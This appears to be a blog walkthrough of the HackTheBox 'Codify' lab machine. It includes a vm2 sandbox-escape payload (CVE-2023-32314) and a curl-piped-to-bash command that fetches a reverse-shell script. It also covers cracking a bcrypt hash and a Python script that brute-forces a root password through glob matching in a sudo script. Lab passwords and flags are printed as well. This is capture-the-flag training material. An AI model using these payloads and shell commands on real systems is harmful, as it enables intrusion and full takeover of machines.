---
title: "Codify"
datePublished: Sat Apr 06 2024 18:29:54 GMT+0000 (Coordinated Universal Time)
cuid: cluofj7js000608lggxdi5efb
slug: codify
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1712428182918/63ad9ff0-42f2-4414-8e03-8adcb20fa97c.png
tags: hacking, cybersecurity, hackthebox, cybersecurity-1, oscp, cybersec, hackthebox-machine

---

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427902159/d4721e0d-727d-45bc-b87f-f62fed3c6a0f.png align="center")

IP: **10.10.11.239** Starting with the nmap scan

```bash
nmap -sC -sV -o nmap 10.10.11.239
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-03 05:33 EDT
Nmap scan report for 10.10.11.239
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.10 seconds
```

So as we can see we have only 3 ports open `22, 80, 3000` on `port 3000` we have a Node.js framework running. So let's add that to our host file and let's explore the webpage

```bash
sudo nano /etc/hosts
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427897334/1193b177-ccb6-448b-8bce-517ed128d017.png align="center")

Now let's visit the webpage.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427894658/4579be00-fed7-415f-8200-6076f2bb0439.png align="center")

we have an about us page let's explore that first

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427891276/fb2a82b8-0fbf-460c-ba88-6f6937a6bac0.png align="center")

As we can see here It says it is using the `vm2 library` to run Javascript code in a sandbox environment. Doing some Google research we found a CVE

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427888688/91271d38-4017-4032-adfc-50ef871e5e00.png align="center")

So here we have found [CVE-2023-32314](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427885412/a96127e0-f852-493e-b324-b38adba7f5fc.png align="center")

Moving to the Editor page and then trying to exploit the above code

```bash
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("cat /etc/passwd").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

So we modified the exploit to see if we can have a look in the passwd file

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427881045/129eb1f2-15f7-4a3d-a498-9d796a24b92a.png align="center")

And yes, we can see the content of the `/etc/passwd` file now let's create a bash script and try to get a reverse shell.

```bash
sudo nano shell.sh
```

```bash
#! /bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.64/1337 0>&1'
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427865530/dfe9521a-25c3-4201-b3a6-ee966e9cd9ce.png align="center")

Now let's set up a python server and get a shell

```python
python3 -m http.server 9000
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427862663/e2136fc1-41f8-4fd5-b8ae-58a8256c26d7.png align="center")

Now modify the script with our payload

```bash
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("curl http://10.10.14.64:9000/shell.sh|bash").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427854250/47e0f139-f567-4dcd-9979-d316f74992b9.png align="center")

We got a hit on our server

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427852107/45a1237a-83e7-4a43-b93f-a705483dad47.png align="center")

Now let's check our netcat listener

```bash
rlwrap nc -nlvp 1337
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427846923/854485a1-fed7-4138-b81c-aad931401f45.png align="center")

So we are logged in as `svc` user

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427842667/8a559273-320f-42ed-8455-94abcf1ffe56.png align="center")

we have a user named Joshua let's try to find something to switch users. While enumerating on the website portal we found an interesting thing

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427833811/99d8b1f4-20c0-46c1-b8af-de8a04e0f336.png align="center")

In the `/var/www/contact` directory we can find `tickets.db` file. Take a look at the content.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427825168/ea0b8093-b623-4fd8-8ff4-1e243b37092c.png align="center")

we can see that there's a hash for the `joshua` user. Let's try to crack that.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427820292/c2cc84e4-21cd-48c6-b0ed-d2777048bd7d.png align="center")

We check the hashid of the hash captured

```bash
hashid hash.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427813908/48cc4f05-6804-4189-ad75-036227ebae85.png align="center")

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427807070/d1d351dd-7bf5-4b64-a561-566e5c659480.png align="center")

so we got the password `spongebob1` Now as we saw on our nmap scan we have `port 22 ssh` open so let's use that to gain the shell

```bash
ssh joshua@10.10.11.239
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427803566/f79c3cc6-de42-4c03-8f1c-3c6567b9a4ee.png align="center")

Now let's get our user.txt

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427796002/88e21943-6b21-4265-bff7-1d49418b71f7.png align="center")

Flag: **b592024dc71df7e461888c5d50a8fb4b** Now let's escalate our privileges to get the root flag. By running `sudo -l` we can see that we have root privileges to execute the [`mysql-backup.sh`](http://mysql-backup.sh) script.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427784355/760dcf3e-a096-46a6-9876-c262b6946d0b.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427774861/c53ba125-8b0e-4407-b761-49fc17b65175.png align="center")

The vulnerability in the script is related to how the password confirmation is handled

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
    /usr/bin/echo "Password confirmed!"
else
    /usr/bin/echo "Password confirmation failed!"
    exit 1
fi
```

This section of the script compares the user-provided password `(USER_PASS)` with the actual database password `(DB_PASS)`. The vulnerability here is due to the use of == inside in Bash, which performs pattern matching rather than direct string comparison. This means that the user input `(USER_PASS)` is treated as a pattern, and if it includes glob characters like \* or ? it can potentially match unintended strings. For example, if the actual password `(DB_PASS)` is password123 and the user enters \* as their password `(USER_PASS)`, the pattern match will succeed because \* matches any string, resulting in unauthorized access. This means we can brute force every char in the `DB_PASS`. Now let's use a custom python script that exploits this by testing password prefixes and suffixes to slowly reveal the full password. It builds up the password character by character, confirming each guess by invoking the script via sudo and checking for a successful run.

```python
import string  
import subprocess  
all = list(string.ascii_letters + string.digits)  
password = ""  
found = False  
  
while not found:  
    for character in all:  
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"  
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout  
  
        if "Password confirmed!" in output:  
            password += character  
            print(password)  
            break  
    else:  
        found = True
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427756969/ba8b9c75-d384-4ce2-b0fb-858f3bca4670.png align="center")

Now let's run this script to get the password.

```bash
python3 exploit.py
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427743567/723f87fb-a4c4-4d09-8172-d596bbc7d2af.png align="center")

So we got the password `kljh12k3jhaskjh12kjh3`. Now let's change our user to root.

```bash
su root
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427726240/c63ba598-7835-4de1-8d1c-5f6b7ccc0dcc.png align="center")

Time for our final flag root.txt

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427721788/42e913b1-c6c8-4c8a-b82e-62ca26b22e41.png align="center")

Flag: **27668e638861d973df7570af9f520528**

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1712427706530/21a9ef2d-c7c3-430d-9d6c-825282a09cad.png align="center")